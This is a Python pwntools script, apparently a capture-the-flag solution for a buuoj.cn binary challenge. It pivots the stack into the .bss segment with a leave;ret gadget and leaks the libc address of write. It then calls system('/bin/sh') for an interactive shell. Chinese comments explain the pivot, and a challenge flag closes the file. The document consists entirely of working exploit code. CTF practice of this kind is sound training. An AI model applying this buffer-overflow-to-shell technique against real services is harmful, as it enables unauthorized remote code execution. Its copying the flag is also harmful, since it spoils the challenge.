#-*-coding:utf-8-*-
from pwn import *
from LibcSearcher import *

io = remote("node4.buuoj.cn", 28916)

bss = 0x804A300
write_plt = 0x8048380
write_got = 0x804A01C
main = 0x8048513

payload = p32(write_plt) + p32(main) + p32(1) + p32(write_got) + p32(4)
io.recvuntil("What is your name?")
io.send(payload)

leave_ret = 0x08048408
io.recvuntil("What do you want to say?")
payload = "a"*0x18 + p32(bss-4) + p32(leave_ret)
# mov esp ebp
# pop ebp       
# pop eip
# call eip
# leave=>mov esp ebp;pop ebp   ebp覆盖成bss段地址，那么mov后esp就指向了bss段地址
# ret就是执行，此处指向的目标地址，要为该地址-4字节。因为mov esp ebp后执行了pop ebp，此时esp会+4，下一句ret 执行的是esp+4的地址，在这相当于bss+4，
io.send(payload)

addr = u32(io.recvuntil("H")[:-1].ljust(4, "\x00"))
print(hex(addr))

libc = LibcSearcher("write", addr)
base = addr - libc.dump("write")
system = base + libc.dump("system")
bin_sh = base + libc.dump("str_bin_sh")

payload = p32(system) + p32(main) + p32(bin_sh)
io.recvuntil("What is your name?")
io.send(payload)

io.recvuntil("What do you want to say?")
payload = "a"*0x18 + p32(bss-4) + p32(leave_ret)
io.send(payload)

# gdb.attach(io)
# raw_input()

io.interactive()
# flag{714df295-8fde-4676-a4cc-1a91107d5bb3}